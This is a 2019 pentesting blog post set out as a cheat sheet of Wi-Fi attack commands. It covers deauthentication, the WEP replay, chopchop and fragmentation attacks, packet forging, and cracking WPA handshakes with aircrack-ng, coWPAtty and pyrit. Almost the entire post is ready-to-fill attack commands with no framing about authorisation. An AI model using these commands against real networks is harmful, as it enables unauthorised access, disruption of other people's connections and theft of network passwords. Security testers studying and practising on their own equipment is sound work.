Title: Attacking Wifi - Commands
Date: 2019-12-03 18:35
Modified: 2019-12-03 18:35
Category: Hacking
Tags: pentest, hacking, Wifi
Slug: attacking-wifi
Author: Jesse P Lesperance
Summary: Commands for attacking Wifi

## General

#### Monitor Mode
> `iw dev <interface> set monitor none`

> `airmon-ng start <interface>`

#### Scanning Networks
> `airodump-ng -c <channel> -w <capture> --wps --band abg --essid <essid> --bssid <bssid> <int>`

#### Deauthentication Attack
> `aireplay-ng -0 1 -a <ap> -c <client> <int>`

## Cracking

#### IV-based Crack
> `aircrack-ng <capture>`

#### PTW-based Crack
> `aircrack-ng -z <capture>`

#### Word List-based Crack
> `aircrack-ng -w <wordlist> <capture>`

#### Airolib DB Crack
> `aircrack-ng -r <dbName> <capture>`

#### JTR-based Crack
> `john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <essid> -w - <capture>`

## WEP Attacks

#### Fake Authentication
> `aireplay-ng -1 0 -e <essid> -a <ap> -h <you> <interface>`

#### ARP Request Replay Attack
> `aireplay-ng -3 -b <ap> -h <you> <interface>`

#### Interactive Packet Replay Attack
> `aireplay-ng -2 -b <ap> -d ff:ff:ff:ff:ff:ff -f 1 -m 68 -n 86 <interface>`

#### KoreK chopchop attack
> `aireplay-ng -4 -b <ap> -h <you> <interface>`

#### Fragmentaion Attack
> `aireplay-ng -5 -b <ap> -h <you> <interface>`

#### Craft ARP Request Packet**
> `packetforge-ng -0 -a <ap> -h <you> -l <sourceIP> -k <destIP> -y <xorFile> -w <out>`

#### Inject Packet**
> `aireplay-ng -2 -r <packet> <interface>`

#### Fake Shared Key Authentication
> `aireplay -1 -0 -e <essid> -y <captureFile> -a <ap> -h <you> <interface>`

## WPA Attacks

#### coWPAtty Attack 
> `cowpatty -r <capture> -f <wordlist> -2 -s <essid>`

#### Rainbow Table Generation
> `genpmk -f <wordlist> -d <hashesFilename> -s <essid>`

#### Rainbow Table coWPAtty Attack
> `cowpatty -r <capture> -d <hashesFilename> -2 -s <essid>`

#### Pyrit Sniff
> `pyrit -r <interface> -o <capture> stripLive`

#### Pyrit Crack Dictionary
> `pyrit -r <capture> -i <wordlist> -b <ap> attack_passthrough`

#### Pyrit Crack Database
Import Wordlist into Database
> `pyrit -i <wordlist> import_passwords`

Add the ESSID of the Access Point
> `pyrit -e <essid> create_essid`

Generate PMKs for the ESSID
> `pyrit batch`

Launch Pyrit in database mode
> `pyrit -r <capture> -b <ap> attack_db`


